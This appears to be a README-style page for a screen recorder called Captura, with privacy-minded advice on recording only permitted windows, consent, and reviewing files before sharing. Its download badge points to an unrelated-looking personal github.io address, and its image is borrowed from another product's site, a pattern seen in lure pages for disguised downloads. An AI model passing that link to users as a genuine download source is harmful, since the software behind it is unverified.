# Captura - Record Your Own Screen

Captura records the screen of this PC and, if you turn it on, the microphone in front of you. The result is a video file of what you chose to capture. Record a window you are allowed to show. If another person is in the meeting, follow the rule you were given about recording. Captura does not reach a computer you are not sitting at.

---

## Why It Stands Out

![Captura ready to record a window on the user's own desktop](https://www.macrorecorder.com/site/assets/files/20936/images.png)

A short recording is often clearer than a long written list: a menu path, a bug, a lesson you are teaching. Captura writes that recording to a file you name. Pick a window or the whole screen on purpose. A full screen can include a chat, a password manager, or a notification you did not mean to publish. Stop, trim, and watch the file before you send it.

The microphone is a separate choice. Leave it off unless you intend to talk. People visible or audible in the take should know they are being recorded when the context calls for that, and you should not record a call you were told not to record. The file is ordinary video. Store it where the rest of your private files live, and delete a take you will not keep.

---

## Core Capabilities

- **This Desktop:** Capture a region, a window, or the screen you are using.
- **A File You Name:** The recording is a video on disk, not a stream to a stranger.
- **Microphone Optional:** Off unless you mean to narrate.
- **Watch Before You Send:** Play the file and check for notifications or secrets in the frame.
- **Delete the Take:** A bad recording can be removed like any other file you own.

---

## Performance Tips

- Close chats and password windows before you press record.
- Record one window when the whole desktop is too revealing.
- Leave the microphone off for a silent demo.
- Play the file once before you attach it to anything.

## Quick Setup

Prerequisites: Something on your screen you are allowed to record, and a folder for the video.

[![GET Captura](https://img.shields.io/badge/GET%20%E2%80%94%20Captura-0f766e?style=for-the-badge&logoColor=white)](https://seitannabella.github.io/.github/captura-region)

1.  **Install:** Open Captura from the build you chose.
2.  **Pick a Window:** Select one app, not the whole desktop, for the first take.
3.  **Record Briefly:** Ten seconds is enough. Leave the microphone off.
4.  **Play the File:** Confirm the picture. Delete it if a notification leaked in.

## Ideal For

- **A Bug Report:** The menu you clicked, without the rest of the desktop.
- **A Lesson You Teach:** A window and a narration you planned.
- **A Meeting You May Record:** Only when the people in it were told, or the host allowed it.
- **A Private Draft:** A file you watch and then keep or delete yourself.

---

## Troubleshooting

- The video is black? Pick a normal window. Some protected players will not capture, and that is not a lock to remove.
- No sound? The microphone was off. Turn it on only for a take you mean to narrate.
- The file shows a chat you forgot? Delete that file. Record the single window again.
- The file is huge? Record a shorter region and a shorter time.
